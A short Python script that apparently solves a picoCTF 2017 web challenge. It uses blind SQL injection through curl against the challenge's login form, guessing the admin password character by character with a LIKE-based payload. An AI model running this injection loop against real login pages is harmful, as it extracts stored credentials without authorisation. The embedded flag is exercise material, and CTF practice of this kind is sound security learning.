#!/bin/python

import subprocess, re

def doShit(s):
    try:
        return subprocess.check_output(cmd, shell=True)
    except subprocess.CalledProcessError:
        return doShit(s)

secret      = 'not_all_errors_should_be_shown_fb83c582ee9b64d1f446cfd0170'
alphabet    = 'abcdefghijklmnopqrstuvwxyz1234567890_'
while (len(secret) < 63):
    for i in alphabet:
        cmd = 'curl -s "http://shell2017.picoctf.com:35428/" -d "username=admin&password=\' or pass like \'' + secret + i + '%\' --"'
        #print(i)
        result = doShit(cmd)

        if re.findall('Login Functionality Not Complete.', str(result)) != []:
            # success
            secret += i
            print("Progress (%d / %d): %s" % (len(secret), 63, secret))
            break
        #else:
            # failure
